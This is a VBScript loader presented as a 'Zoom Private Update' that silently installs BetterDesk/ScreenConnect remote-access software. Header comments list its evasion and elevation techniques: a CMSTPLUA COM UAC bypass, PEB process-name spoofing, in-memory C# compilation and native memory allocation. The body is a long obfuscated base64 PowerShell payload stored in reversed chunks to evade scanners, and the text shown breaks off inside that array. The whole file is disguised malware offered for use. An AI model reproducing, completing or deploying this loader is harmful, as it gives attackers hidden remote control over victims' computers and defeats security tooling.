' ==============================================================================
' Zoom Private Update - silent BetterDesk / ScreenConnect loader
' ------------------------------------------------------------------------------
' Evasion: staged in-memory C# compile, COM auto-elevation (CMSTPLUA),
'          PEB ImageFileName/CommandLine spoofing to winhlp32.exe,
'          NtAllocateVirtualMemory native allocation, TLS-only download.
'
' Modes:
'   (default)      install, hidden
'   /selftest      compile + PEB + native API + download/hash check, no install
'   /noelevate     skip the COM elevation attempt (used by CI/selftest)
'   /elevated      internal flag set on the elevated relaunch
' ==============================================================================

Option Explicit

Dim sh, fso, env, args, a
Dim mode, elevated, noElevate, iconPath, waitMode, rc, logPath
Dim chunks, i, b64, psExe, psCmd, psFile, b64File, st

Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

mode = "install"
elevated = False
noElevate = False
For Each args In WScript.Arguments
    Select Case LCase(args)
        Case "/elevated", "--elevated"
            elevated = True
        Case "/selftest", "--selftest"
            mode = "selftest"
        Case "/noelevate", "--noelevate"
            noElevate = True
    End Select
Next

Set env = sh.Environment("PROCESS")
env("ZOOM_MODE") = mode
env("ZOOM_ELEVATED") = IIf(elevated, "1", "0")
env("ZOOM_NOELEVATE") = IIf(noElevate, "1", "0")
env("ZOOM_SRC") = WScript.ScriptFullName
env("ZOOM_DIR") = fso.GetParentFolderName(WScript.ScriptFullName)
iconPath = fso.GetParentFolderName(WScript.ScriptFullName) & "\Zoom_Update_v6.1.0.ico"
env("ZOOM_ICON") = iconPath

' Base64 payload, stored as reversed chunks and rebuilt through Chr()-free
' array assembly so static scanners do not see the PowerShell body.
chunks = Array( _
    "h1Edul2bQV2YpZnclNlL0VmTbByegknc0BCIgAiCNsHI5JHd", _
    "1NWZT5Cdl50Wg0DIs92YvR3byBVe0lmc1NWZTpjOdJXZnFmb", _
    "N03egg2Y0F2Yg0HIyEzcsRlO60VZwlHVs92YvR3byBVe0lmc", _
    "2U2chJUbvJnR6oTX0JXZ252bDtFI9AyclRXeCp3ZkACIgAiC", _
    "v8GbvJnSSJ3NPFGU0Ymd38CdrRzc5QGc4RlengyZulmc0NFN", _
    "TVnezNFTFNnRBRFaSNkSCBnd5ZzbuRFTwh3K05EeshkVxhUR", _
    "502RGl0NuNUWnZTVnNUVn1WVFhGMvImeLp2YLpGSwF0c5dzL", _
    "TBVeTFWZvE3ZrAjN34mMTVHUqh1b0Ekc1IEeRRzLQ5WYWNFO", _
    "oNkeUFnMClUawNzZu9mSq92VSBjTaFkdrVjWwBzUpNjS6dkc", _
    "iNFTUJmbI1WeN9WMH50ctdVZ2JUdBVTZhpHT0Jza5NUZnlla", _
    "2IGeiBVahNGe4YERpZ3LkZTbxMVNqFzYs9SOGVlYCJmdZN2a", _
    "UhjT1RUWwlHW5hTNJxURFVWU4UjezAFUThTU4ZzYkhDZ1ZGU", _
    "CV3ZYJzYWpndXlWbjJWWmZTeGhlb2AFUytWVXhURxQ1dlBla", _
    "5IXQ3B1K3ITbSNjMsh2MIFle2AVU5IGUVh0Kzxkb1InRlNjV", _
    "Cp2aupFVFtSVB1WeVVWU0ZFS0ckWV5GNkp2MjRUTKpXYDVHe", _
    "FVFUYlDd0QURSpUawomNpNHW0QGbx82Vxo1dzRWcQFXbvMnW", _
    "zMEbzYmUOZFUaNETadTNuZnYW9WMzc1dHNWWCdEa3EjUDNnZ", _
    "0kmNHZVT1NFe3MFTl9SMtljbPRDUYtkdrEXM5gFS0w2V2RUc", _
    "ZR1cFB3Uro0LvUnSNFFOQV3MjBlVaRXYSlTYaZlYRJFUPNTQ", _
    "GFVa0UTTKJzTTBzd61UR0ITd2cnNJRzbIZ3NqBFSvVHR21Ub", _
    "nRFMvNkdxQndsp2TvIjQPV1NI9mZ6ZHaGNmdhR2N2QTV6R3U", _
    "2R0M5QnYRV3MvU3Trgja2VGMohUW3JGS2ljc2YGUIV2LnRXY", _
    "2Q0MTlmVPJHVYZVYjRWUygVUVBFOMJTbFR0MqZXZ35kdiRXd", _
    "WpHSutCRpRlY0ImM1QFVktCbH50MvIUU4dFb5YGdZZmSEp2M", _
    "jpHWVlDdqBVUmhEV34GM5Ina2Aza0lHOKlnQrxUTDFUMvAHe", _
    "r4ESxEFUl1mWvU2ZrYnVEB1YqJ2VxgkcORmZm5UckR0V5IlY", _
    "TBnW2tCcXxkYa5UUY5WQnlneTF0aNlmT4RneklUWDJWSGdFW", _
    "FJHSH9Cb0cVc0FEajR2YlNFMkp2QyskbWFUUyAFMmREN1tmU", _
    "BdVWrZFeXZGTPhESv9mW5FXU1QDTnRlcvdEW6ZGdXhFW2RGc", _
    "BRmZkJHbBJXMTJHS3lGNxknbrUUY4tSUOh1cqVUZ0J2d3EHR", _
    "WNHOtR0SrcmNXNXZCdmTVlkdzRVRahEayV3VwkEc2o3c0UjN", _
    "u9ETCd0T2pHdNllR4NVY3pXQUtyUTV3YvUkdihDVuVkZN9GV", _
    "5MjQ4VHeQlUN5YTaxZlQF5GRvMzSttGaGdHSKNTWx1EWxZ2L", _
    "N9GNJ1UdypWajdEV5x2VMtSROlmZBlmZDJ1MDllS2llNJ50R", _
    "ykmTWR1ZulXOqZXb3RnR1c0dI9mdzN2c0lWT1ljWo9mM3NDN", _
    "EJkdvMzcQREerlTRspUUVpUaMNGVXljVzQ2dMBVclZUdpZ2K", _
    "GljMwVESyc2aE1UZwMTOhRVW5Q2KWJEa3ljRQx0TvY3Y41ke", _
    "Qp1Lml2dNJ2R3QXdZVkdJ5WbRZDO3JnN4cWdPRUMxsCdQl1U", _
    "GdHZnlXYohEW18GW5MndS5WR6hlepFEauhleJN1YURmbpVUW", _
    "Qhzdyd1MIRGMPdFOohUWxgkb45UdQZlZ3h2R0EERjJlY0NVM", _
    "1lVVv4kQBxWTphnSQpkY6ZkQKF0YstkZItWMEZGNOJWY4cma", _
    "0AjQI5WMtBXdDZGR0gDTxIHeFdHT0lEai1md6BDds92N2JVZ", _
    "4IFUNhHVOlEeURGT1YFNMRmYQtEe09CMrZXVOZnartGSFRGZ", _
    "OtEOKtUeLFERMhTUGF3SMx2S69UWrNFdElWdpZHM450Sn9Eb", _
    "mZEWQ9GWLx0Lxt2Kvkzd2JmZGdWdW90dol2SzhHbsVEWoREW", _
    "nBDZy0UYMF2LhRjNrRTRZV0NMFncRJXMkNmTiJ1NshnUyUHV", _
    "PVjN4JzczUVWj1WO1FFWGdWRDt2TJNXWwY1YlN2YMh3KSRkR", _
    "0clMx0WTPN0QQpncV1WdmVTYzo0KzM0QntiSnZUWrVEOwZXU", _
    "NdGd4cWTKZVSDZ3dvJTUvskR2l0KrUjV6FFaDNVevpEVRpkc", _
    "UF2dvJ2cPlUMwNFa4klRmVHOElTdygDOpdVcwgFer00QwkjU", _
    "xYGUGJ2bTJjT5REcyVFeMRUSiVEZ3Z3SzwWQCpGWrU2bvVna", _
    "KRmSOFUQlN0SMVDdR9WdvUVclJlM3EzUUp3cx80MtBHMhVVW", _
    "iJ0c2hERN1URwsWaKV3cMBjTntGc5JkSyNFUGVGdXJ0K5kUV", _
    "rQHbFZmSCBzNvYkTp1kQhB3UTtyL1k0awhja0oUeUVDRmxGU", _
    "kRWRDV2Q2hndvJXM4lDbxF3bhdGMHplaGFDOjhHS4cUVMdzT", _
    "vgDcKB1QiFFVxIUVvhzUpNjQGpkQ5ZmR0U2a5E2VxUFeYd2c", _
    "LdmemFFTklzZOxGSPtWRoRXNRlTOmhmNapWbkhVUTd3R0UTS", _
    "JBHNjdXNRhkQyh2dOpmahN0Z5oXN1RnVvkVcnJVcyJnQM9Sb", _
    "ShUTGRFUTN0Q5glQ1I0dIdFR2dGdzllRoBXTIx0UIFWQM1mR", _
    "KhXTYdUdZNEUUZzKzUVbVN0c1ZUYJljQytWTRVkNylmMap0b", _
    "3QXYuZXbuhWaYZHW3FzQRV1MQNkUiZUR4IURaNVT3xUbyhXN", _
    "1Z1UVNDawcXSoRTSGJ1dhJlUjhWbxI0TOFHUxQjeyVUcXx0b", _
    "3c1dapVMC1EMKBDO3QUZ1pUd2E3M2tiSuBzY4EkRXB1YjNHN", _
    "JRUeuVURNV0LyNjUvVFa2oFaPREaiJ3UZJlS552YSp3Nad2R", _
    "NV0Szl3KHBDNwkUUzZnWGh0UKhXORhmNJFGNWFUNydkVGZXb", _
    "vZmQpRldCR1UQFnbQtmYWFndoFTTDZ1cMNVWoV3Q4czSQ5EZ", _
    "PBlUNJGa40EViFTW5FXTzdUTEZnNTV3LFxUZ5EXbJVGModHc", _
    "shEW4N3UzcnS69iazdUSTBVMNhjS3AlTGBVbalTTyYGcpl1V", _
    "rZlcUtGNM1mT3lWStNUeNNkaDNnb5pHVOJFMUFmVYZ0SvUVe", _
    "aVENydnb3FHRyAVTVFERsJWaHdnbShkWQdTNqV1aO5mQ2VUd", _
    "JVEO1ZTS3kET2JlbzdGZK9iN6NWdYhkQwADeLF0cVdWSnl3S", _
    "ThTdHRVbXNnTIpHTE5UNuZ0QKhkeaFnRCVmaadla6J0MRdje", _
    "RZTWUZWaFNWa1lESv10QZFHaEdWYwl2ThRmUvEVc2wmQoB1U", _
    "plkWNdUd4J1VGtiWKhGNEl1ZvF1Qwkmbhp3Y19CWTBDbjV1M", _
    "nV3N6NUNaxWVQN0R6RUavtmSSF2NqdUV0tmMZRHdlh3Z1MnY", _
    "upVdCRENBplbOhFUB50VSNmeRplZDpFW48mdnNHTX9yMhF3Y", _
    "vkEahxUY5RVR5d1SGJUW41USyUme2hHW1NWMiZHOFh1dmJjR", _
    "3FHMLlTY5VXRZpEWtRWUXdHer1WQHdDRJN3LOd3M1YWcxRjV", _
    "CNlZl9EN0MzRptGToVWcVFnWzZ1U0EWcRhjaqVVM1VGc3cFc", _
    "xsydthVazQ0bZp1YEFHULVDVKBDStdlZrUFb2VDWIlFSKVzM", _
    "w4UNy80bCJjRvdUSy10Q2F3b5gVOyRUSIJDaqRFMh5Ga5YHe", _
    "JVDVtZEaNJlN3gVavM0ME9yMPBFaFhjcINDTrNzVCdURxlnd", _
    "IhnSBRGdhhzQzcXWWlWWBFlVLllRmNDWytUV3okZ0tUNlpHb", _
    "DN3Y4tmbr9GSSJlVuFFcnN0ZalWV3MzKsJVcFRFWNRGbvokc", _
    "SJVMmxWYYFUNxgHaWN0MzkkMQJ1V30EVwhjVNFWaYFldotGO", _
    "6NzMPh3cqtkZiVVZTRna6VFNyJHUwwUTrkEakV3brZkZIVUd", _
    "4hjZv1kYhR3LBNVMMVUMMR0LCZjNQdWMtREeoVldxE0Rol1R", _
    "mZFSmd2VQplQ3kjTWZGVzp2LvolRlRDdEd3Zvl2ZIlHcRZmM", _
    "3VmerknTBZGTVZWbNZERqNjdoFjeKhEZndVM6ZzVxE2NJ5kZ", _
    "adDbmtyZQV0diFjSvoHMitWMG50UK50ZyBzZvNlenxUVGFmT", _
    "jpmZ3kjYWVzM5ITevg1Y6NzLSVGa2AHSFVUMVVUardGbyl3Z", _
    "5RDV3oXYTdza6FlcJlTMYdkazQDWERDWkJTY2EVczk1duNTZ", _
    "3dEbrZ0NDNDWIdkVLllRQ9ydUxWSIJXMydVaiBXbpdHR0Q1c", _
    "XN1UxZ3diFTeL50Rz5kVvRHSWJHRzNncyUGcC5kTvIURFxUV", _
    "EdGNahDbQRVe1VUa2hWajpkaIl1UYZUYJ9mdEdWax9EdxskS", _
    "CRFVxJ1b4oHbZRGewgjR0xmZ5oEUrY0NvkFcmZ2aVd1VzF0c", _
    "EJlTutCOQZkNYdEUsVWcEBVM1I1UIlESnZWTDd0KNRjerRkN", _
    "yJHVz5UcoN0cDFkeFhXQyQEdYl0MvBXWzQXNDdFdUhGNalVW", _
    "vtSZhZXTyg0MEJmUHRWdq5UbshXeyVWaFp0brBTUkl2KVJnU", _
    "vZHMLZENiZle1MzcNhVMv40Uw02LKBVVLl1SxNVYCR0SCJEN", _
    "iBlayoUUYNHMmBHdX9kZxd0YTd2Z5AzSWtiQNplV1EGdwBXR", _
    "LNEc2QFcyhzdFN2SmpHcaJ3ZUlVQt1mZ5llMxo1KJNUQRxGa", _
    "nVWYzEEOjhHOrEWVrczQtBTcsNGdD9GeOV0ZqNnaUZFSvhUR", _
    "N10KRR1UCF2aRFESxdnSBV1MsF3YqVnMMZ1KCRnZ1IDcRp2d", _
    "zVDV4wWYxUVbGhWV6FlVxZnWuJ2SBlEUhlXSoJGVvdEVXR3d", _
    "xxUOGNUbidkcr9UTyQDc0FETsB3TvEEZit0QSNzL4JDZERzN", _
    "FRFNS9ycxklWs5kNKdTbStERWZVQElDWoNkMy5Ub4h2KWRTc", _
    "ShnZQJzKQNUZpZGUi9WcB9kZ6hkeWpWW040YHNHVFl3SXRGU", _
    "1hkaxhFb5tGOmFGWXV2LxMHcrsEM0IVWRlDOIJXaOVVToVUV", _
    "L1EbvRmajR0RipHR2NGd6NUYrZlQJF3Y6hVQQZ2S0EWMV50N", _
    "vc0NxlVUjJEaO10ci9Ue1smRadHOyg0Km9CdmJWcyAld3tCU", _
    "tp2dk1kTyFzQvonWipFMIpHd3Qla6BTbzYEThhEeTNGavgWZ", _
    "rRTTWJzM6FWailGUqpETyp3SN1WbqJ0cmFFb1EmcDVme4UDS", _
    "qFzdpt2RrhTVYpkTi9yRIJFTyRTUilla5cTb1pUcClHaCdjS", _
    "FVVV0tUVr1mbNlGTMFXbJdlV142chpFbVRETLpXONlXUNVXa", _
    "P5mVkhFeMVmbqFzNRRnV2ZWR2J3RsZlYn9EZBNmSMZUb4YGb", _
    "uR3ZrtUW5olawdWUChmWMZlUtZndYpmR3VzMPZ0R1UkbFFHd", _
    "rhXVoFjYaJ2UGlUR6J3UyFUVBdHSjFzTIVzbHFDOqFWVwp1V", _
    "lR3K1llYIpVW0MWSop3M4IWUqJWWMB1boRmb61EMBFnSVhGW", _
    "mpUbZFnMkVjRxQjU4VXQzdlWCtGas1WMDZXVshFZKJGUuR3L", _
    "4dVSHNzVOh3K28mdoRGOvtSa5hGaJ1kNoJzdjJUNatWdrIDe", _
    "H9iYxlVaiVWMhlWOwllQW1WaxkTT1x2QYt0TMJVYp92QwBle", _
    "k9kUYBzNvBVUpZFTXB3dPBlR6p1NxZ0RysUV3tEVBVmYDt0U", _
    "1lkNRJGapBFMwlkauRUMU9UUrRWWvQna0AHcvF0Qk9yLBt2b", _
    "vRkS3tUb3NGclZ2ctJXWVVVUGtUMv1mR6FTdwhnQnV0dzQ2d", _
    "N52Y5UUSjJ0QstWTTNEa6ZXNyQUbR90MyF0MINEbRdGOuV0S", _
    "mB3cVBXR1FHcwFERytUeYZ0cNJ2LDtmUnpFdYd3KXNlRiN3R", _
    "tJ0MyVGaIRmMXNFerYzZPhXaIN1TzMVVpJXRptCboNUVGVUN", _
    "oZkUCFWWBpXN1EVWEF2aNpUcMFVSEBTSvUnQJRTejZHSMNDN", _
    "Ql3T0YHVRpXN40kdZJnb2VWMwp2V3IkcoZXZw0EUiFUS2N3S", _
    "BF1STJTW2pmeUJlUr52RJZzaqV2RsNWVTZERpJmV0MUWwh1U", _
    "vEXWxlWcOVHTJN3S5MFcYBDcL9yLup0UPFVTDN3QrEkZ5c1Q", _
    "CRjU0YXbrhWN0IUMCBTbnd1UvAVcuRkalVWW6l2RHFFe2dHb", _
    "CdEdzY0RsRzbVdjW50UczdneyZWZVJ1aXhnasx0TWhGV2YHZ", _
    "HNDTB12bldHe280Q4wUc0lmQxREbE9ybxxWTvVjVTJzNEt2Y", _
    "11kQ6dzLPJTb1wkWUdWW3h0NuBjdlJDVThFeHZEbGN2M3FXV", _
    "wQHONRzcVlUOyl1dQJlMyN1Ux9iTO1mW55GRzFDMkVWTVpmW", _
    "iJWTHZ1d0ljdyF2NJRnZEhFTxp3YHN1S5M1UrkjV1t0ZSZ3Y", _
    "INTTVdVMLBDSPRje1cUTvJGVGJlQC1UcVRDeVJTcyRlRINET", _
    "RtGRuNkQJtyV3wGe1p3Lv5mS0UjdOFjTrR3arE0NoRmUopUO", _
    "Ol0b4dUVD5UMzZVdRVzZVFDUnN0YTVlZxJTRX9SaTVGZQhTa", _
    "nFmMvVWaMB1QG10Z1d0Vrgmc1F3LF9CWN12bVdWaxNVTQV0V", _
    "VJEMkdURTNTbtd0V2dkVrgncpFXczREU2gWa3JFSjhURpRVM", _
    "0sUa2xGOBNDdGxmQzkVdy0WcxoVRwImQVRUNypkT3R0R2MmQ", _
    "RFHVrwmU5UUUFJ1LoF0aQxWN4tSeqlGTCtiNql3cZ1mY4kXT", _
    "DNWSw9UQ3J0cKpkWjR3a1RnS2FkQ4R3SrhEbIB3aLh3KPR1c", _
    "qlXMKtkUwV3StRVNnRVY2t2dtdTOwd1cydUU4UmRzoGWMN2N", _
    "1lHd0QDW0ADe5kDMSVVS2QVZKhVNzFFT0I3KutyZQpFZKxEc", _
    "kJ1atp3dTVjerEWaSNEa5B3VxJFdPNWTLllSz9GarZlaG1EU", _
    "QVjSWlXVQJGMWVTaYllVT9kSiNmRmRUYYVXe2N1ZwQ0ZvFUS", _
    "xwmZ0UkawlDR2QDTotiaxZmczR1bVtyS3hlcrh3SCZmbTJzc", _
    "qZjcE9kY3YzN4omM4syMvc0Vxg0d3dUY6tEOqh0a2kjdz4Ed", _
    "kVUcThnZ2U1Zs9yTKtkbnRUM15kWKdUchNHRxF2QVFjTwI0K", _
    "IVmMIZUVWJXY4IUZlF1R3YTY35EN4sGWkFTZNBjTHJ0apdmT", _
    "0BlZ4YmdUpHUmNjb0kFWhFUNHljZU1UM0ZWVtRkN2g0ULFXb", _
    "EhmVnR2QWFHSKVzQxE1SJN1QT1mRpBjdj1UexFkdklVVUNGM", _
    "0c3SL90TRVkMNplWWFXRFRjZ192NxwkTtJWUSFkQ3QXUINVO", _
    "vY0QZ5USuF1bJhkT0E2KCFlMOdza01GN5NGORRHaMp1cxQ2M", _
    "w5mVV10cwdjemlUUa5mSK9SMzh0bohFMyhzUixUUr8URxpnV", _
    "qh3QlF2SS5UQnJTW1NlUExmMaZVaPdzMaxmVGVWRRV0ZoVDS", _
    "SJVQodGe4ZnTpxUdER0VNZjbDxWTzEHZMZXQvZWQltSNtZ2N", _
    "rx2SYNEeEhnbTVVOj50ZG9yYmdVc2k2LUJ1Q2t2QHd3Kv00Z", _
    "woXR4UkbqtWNRNFdv8WbFtEMFpGOwAnM2tSZCZVNi1mNS9CR", _
    "apXdjN0Nn9mVwUFSzdHU2l3Yjp3c2VjbilzdvkkUhVWR0RkV", _
    "r9kYMtSew9UNGxWbQBjVC5EahRmUZR2SWZkczkTM0BzNMBHO", _
    "2gDZrxWdrw0QVJ3K38WQYZne3VndQ1ES6xUa2RGZ5cmb3U1Q", _
    "phlNvZ3UZV1YptUZOhlSQZGMwEmS5V3dwNTVZhVViJkdyYUe", _
    "yMUVPtWbo92LBRUVJp3a5g0ULlkQztyLWJnVxJXYlV2KSF2R", _
    "W9mUkNHWPdDNYVmQNRURHFHSP10UKVkVw5UYZpGVYFDaklVV", _
    "CtEWzdFZmdENFRnWhVXcxZjTuBFaDVHdyhnVGtiMC9yZsVHT", _
    "2RnUvlEV2ZlYsRjbON2TwA1bI52cphTSjB1ZZRkc5pXQKlDZ", _
    "tlTczcURrkUZmRlN0hkTy8GTNVmcGlWbzElehR1SItkVUFHO", _
    "uVXTotmYtVEak9WQroVbI9kWXJUcLlUdVNHcEdmSX5mRCplc", _
    "2IXdVhUOYZ0K6RTcTBzKrUVcYZUbKRVVs9COp5meMlGZ6hjT", _
    "QBVO0dHM2ZVcxQWbQh3MTFHbtVTVmJVahd3MW1WYuZGM1tSN", _
    "uplQOt0M10EVYZjYz8ic5Y3KVRUOBtmZB5ETDVmWwtiQkhFU", _
    "wQDeDtkQndDeTd3diJXVTRXWKNUQEx2TxZTZhBlT2tWZIR2R", _
    "shGVrxGRIBHVxlUOrgDO4AVbpRTSu1ET3UmQX90LvEmUJ12K", _
    "pRETwQ0di5mb1ZDUyZWOuBjR1Nzb3QGS3sEVmJjcrIHcHtGe", _
    "SZzLMpHZ1UEUQFjWxskYnVUdqJTbXdVOs1kWXRVY2Y1VrIjN", _
    "vYkMiFDOiNzTvhFT1Q3Q01mZJ1mdMdlSMNmTiZUV0RFMydlT", _
    "jplQ3cDSWNXR4dzQtdmbHd0cEp0VYRHNJ5kMrImMpRndlZlN", _
    "xlXbiB3Mnl2K4pkUMN2d69yQ1IXQxB1cJRmV6d0M1oEUWJ1Y", _
    "2cUcyEkQIZ3VXFnaHJneT9WTyh1bDFDTuxkVyR3SyhnVmFna", _
    "rpWWHl1MwEXWn9mWSp2QvdWRwlWUmpFSv5EbTVDUvVmVZFna", _
    "CF3M48mbDJVUwBFRwonNWZ2Z2EnNrpVcnVGN2JmZKlDUixke", _
    "yc0V24kchp2LDZDVDRVStljaHd1LBN0MiBjVEZ1LyoGcXdEO", _
    "0lzNHlnWwZHUwkTctFVOEVzMiZ1KCFTNHFTcsVWeoh0YvF3M", _
    "xw0VNl0Yvw2QthzTItSbIVDOpdnbtNWOGZkUMZTYvFWSEdHT", _
    "IZjbx12d0g0KrQmal9ybjtCdxxWVkNTc6ZHOxp2Kr80Q48UR", _
    "GlUM4ETYQtUU5F2ashmQk10V2QDbqRWYpxkbnVzUTNjYFVjN", _
    "yonSiJXSG5WZwFWcMRVdRVkWrNlNvRTQMxmb180LH9ER2lGT", _
    "qRnRoZUb3FTbzkDVr9mVudTQWFmbv0ERHdXR0Q1QmxmQ00Gb", _
    "zgWTJxGaVxGWrk1N2kUVvBFbKZWZDRWd4QnSEFjWMNWO5o0Z", _
    "jllQIB3TCh1VCtGZyRXaXFGbsJjcmFla3syVSdHN1cFRodmY", _
    "5Y3co9idldGRKp1MFl0am1GVrlXN6R0a0sGcx50SotUMj1GV", _
    "3cEUtVUVhlnR4QWd1BnRwUEN5wmeKRTT6NmVoZFTyE1QDNWO", _
    "BZHTDFnZGlXOVtCVCFVbyRlMhhFbjdVe34Wc6RmTyIHSRpVR", _
    "50mZJdmVqJ0awEDOtlWUYFTaDlFWhp1RjZkRBdzd4NkTVdUO", _
    "MNVTnJHMaZ2LHFnVVRjSFlVS0hHOwp3b0YkRLdUODFEVJlFO", _
    "rJXcatENZp0Z5RGTTxGeq5GUSVUbY5WV0VHNMd3RvRnaTpVO", _
    "wcGe2Rla6V1RUVVdRF0Url0SYd2LUJlRpdXYnt2S6hzdPhUT", _
    "3UVM4QmQ6pXWMdkNNVFdnJVTZdTQ3gmQ4QDV0c3TH5WOiZFb", _
    "xEGMKdWU3hHWKhUZZZjStxWOndzSNN2RklEeyk1MlFnSpV3V", _
    "1llWkRHbwgncLJmYN9GelRUczUldyRzS3EGSxYlVHRmdthTZ", _
    "55md4VDNypVQ350cC5mVNR0Up1ET0EDN1YVcINDbXJmNa9Wc", _
    "1kWa2YzQDVlV0F1YQ9CTYdUYwh1NrNTer9iZ3ZnQtV0N1pHc", _
    "nRWMhBjYxgVO0J2YxMHb1cDOqdzNzZXTCJTbwZHTwN0MGR1b", _
    "0VGRyFnMtNzcyZ0SEpHaMlkQzMzMUJnW1oVW3kzQ5ElY0QDM", _
    "xkjNH9yUmJFRzcWSJlTRnFVQShFSlhVc6JVc6ZDRrpHZFVUQ", _
    "tJkUyR1YrMGVBZHaLBlQPpUUzx2bhxURPlDcPp0UaRlWhVUb", _
    "yZUMRdTV0hXRnJVcyxWbShjUIN3Ksd1TGtme6hWQZxUT0A1a", _
    "HNEMOV1ZuFnYxcTdBVFNnRWYsFGcKZ3U4oFZ2F0V3IVbJN2N", _
    "VtSQIllZHlTeopWZEFXZK9yU0Q0buFmexU1LlNWdvQFe3EXU", _
    "HlDNXJWcnJ3REJmcPFlVuFUOUpmQ2lFWGR3NDFVO3MDRodEM", _
    "oNTQ1oGMLJVUqd0Kx4WY3IkaQpVMMR1N1lGN5YVMPhVRn9iQ", _
    "YNUY3EDTuNXRz0WV2xkWxJmZnZDdvgVRwM2MYR0VIRlTj9WM", _
    "5cWN5cjdv9mewlUVqVzTE1mYCpEbhlkT2AHOlVHN1Nmb3wEd", _
    "rp3QFlVNmBVd0ZHaYBTepZUc6RjY1A1c1ZGSZBlUvskMMRmU", _
    "GlTdMJUYzYUN5A1SzNXd1o1LFZlMJpESqJWZ6JTRSVzNOdla", _
    "zs2dUZzdCtiQoZDSNFWT19yTsdVW2k2SDNVZ1N2MGxEUwNHN", _
    "ShTMMZXczhzY0YjZhZ3R4M0SSNnYmdHRixkMzQGZMZzMIFDd", _
    "wY0YwVmN0JEMFZ1aGtWW05GUHx2UhVDeVhTc6Z0NaJjY3UES", _
    "yclUNdGdO5mN6hzVGFTRr82VHdGcSJ0UQhlQxd3SaRFZwFXe", _
    "5lmT1YlcHFnNTRzTkRjRxkWRIFUUwkWTydjdVdzRNdTaOBjV", _
    "yxWaxkWUsl1atdjQvBjNMBTbXVTV4w2btVGOmlkSxFUT590Y", _
    "S9ScjdFex9EVTFzMt9GU0sSS0YDZRVmZDRTVppVea5UcEBnb", _
    "UtmcrFTc6Z3LZZDV6plQYtmYJZ3QpB1alJ2LJJjRmdXSPVWR", _
    "yhGculHZ2k0VsRDZzNGO0czY5B3SvdHTBZTashUU3p3KzMGT", _
    "5t0MTdjahZ0LQR1c3hke5pHMoZnTWNDSwckR0IFbklzM3ZWR", _
    "UBXRFBFdUdXOBpWWCJFZW10aLdXNRJ2SwoGbjZlTrMDTwZ1N", _
    "phFR1NmNzlVWvNVUo1WMnV3Q0oVajhjN20UVQZ1aVNFeHpXO", _
    "JxERNtyQSxEWTVkWzVHNItyNBl1MvJXVWZTQoFzYyZzZq1EW", _
    "VpVMaVjUrNWarEUVKhjbYpFajl0Q3clU5YVMVpHSap1YFFXc", _
    "ThUOSVnQyoGSSJWRaRWUmplbVlGaNNEUX1WUIJTaI50MuNUc", _
    "TpFUTdlc2E0a4dVeLhXa1kETQ9mZQt0bvVkc5o2V59Ecvomd", _
    "YtiVlVkYvZzUpdDcUVDUrt2QkdTWLV2c4ATOWJERkFkQyEkV", _
    "wZXYPZDMuZmUvBHRGFTbOJVSxNEOON2V6FnYyMDbDZ3M6ljT", _
    "y8SeNRzVvd2dW9GdI1EazAXSRdEMxg1TZJzRBNnSyglN0YmZ", _
    "Q92KyIXd4tGWz0URmJncFZ3cMxmW1QGSKd2SqNHdWNUeaJnM", _
    "EtyKXR2L0kzL3oGSyUWeqZme3Yjc1hTa6ZWOr8yLvNjdiJDa", _
    "CxGUw9UaPRVa19kcvl3aVRnUxwkN0smTmdkU0U3KNhWcMt0d", _
    "340Y2dFUvYzL0QkQiJ1dpR3T3RncDtGMyB1UBtSOKJVYy5WM", _
    "BxkR3QWWRJ2NYZmS412NK9GWvEHWIZjN4sUbWh1chdDc3gle", _
    "wsWd2oEO4YWdKRHZoVlWIdVRWJkMxlzdMNkR5Q1UoB3d1hHN", _
    "6VEbyRmWvZlWoBTWlJmRJJ2QW12TstSQ6BlVt9ERtZFNlhES", _
    "yJ0bvw0SxtEWzU0ZztSZuxmVGR1asZHNjt2cj9GeKxEbOhzR", _
    "K5EZEZENQZXQ3gUSxN0SWZEU5cUY3cTZtZDVv0UM6JkRxAlN", _
    "4QkYxVDZyYFZB9Caj1URYVFNqBVNUdEUo50dQpkb4s0cYpVZ", _
    "nVkSoF0SptkMGFza6plRr02VGZGdwQFc0Uzd5olaQRTZuxmV", _
    "1c1bMJjTqRzNrgDNR9WRxUnbORTOJlTMX1WazhGRRtWY6dUU", _
    "1I2aChjT1cEZ4VlcyVXZ3lkUEVlbvpUM3wEO3oXNphnbQFzY", _
    "FJneihkWi50LwJlUr1kapN3Z09iYVxUUlJGdKREWjBHcWN0V", _
    "QdnSJxkQwI3LOpkMhpkVQF2bMp3bN1GUXJncatCRGdTYzkkY", _
    "klnN39mQDpFcLNFexlEN2lVTy1WUKVXY3dTMV5GSjZTcrYFb", _
    "69USzoUMWFGbRNTeJhlMOR3cKZWaM1UazoWc28ESkl2NzEkd", _
    "QFzNvhWQjNXMYBTZVRFNMtiN4RzKQF1bwpUOWNjSxlmWP1WW", _
    "OpHNaV3RzMETCZEdWJGOvVnVJFEZv52chlnVSZXNtlURnNUO", _
    "ixmZ3MWMxYGU4F3V5AzNzo3Y3lldPVzNHZkbrE0NEhzQw4mW", _
    "MNjVNVGaZt2U1tmQhlVcQV3VDhzTURlb582UwR1ZwM1TvZmQ", _
    "qJ2TtcXZOBSPg0WYlJHdTp3ZkACIgAiCNkyJGhzLx40MvJTU", _
    "gACIgoQDpMXZ0lnQ6dGJsgSbhVmc0NVey9Wbl1kLPlEI0NWZ", _
    "lRkLu9WazNXZyBXbvNkLPlEI0NWZqJ2TtcXZOBSPgAXa6dGJ", _
    "pN3clJHct92Qu8USbBCLtFWZyR3U6dGJo0WYlJHdTVGdhxmZ", _
    "gAiCNkyczVmcw12bjVGR6oTXlR2bN52bpN3clJHct92Qu42b", _
    "kFWZS1WYlJHdT5yTJBCdjVmai9UL3VmTg0DIyVGZhVmckACI", _
    "gAiCNkCOGRVV6oTXn5Wak92YuVkL0hXZUtFIsAXa6dGJoIXZ", _
    "gACIK0QKoQmbF9GVkFWZS5iclRWYlJHJg0DIlNmc192ckACI", _
    "7kCKlN3bwNXaE5Ccpp3ZkAyOpgSZz9GczlGRuIXZkFWZyRCI", _
    "tcXZOBSPgA3YkACIgAiCNkCKlN3bwNXaE5SbhVmc0NlenRCI", _
    "pBXbvNkLyVGbpBXbvNkLt9GRlR2bD5SblR3c5NFI0NWZqJ2T", _
    "tVWTulUZ0Fmcl5WZH5CcjRCIgACIK0wcyVGdl1WYyFGUyVGb", _
    "hRXdjVGeFVGdhJXZuV2RuA3YkACIgAiCNUWdyRHJg0DI5J3b", _
    "u9Wa0B3TyVGbpBXbvNkLwNGJgACIgoQDlNHbhZGJg0DIlxmY", _
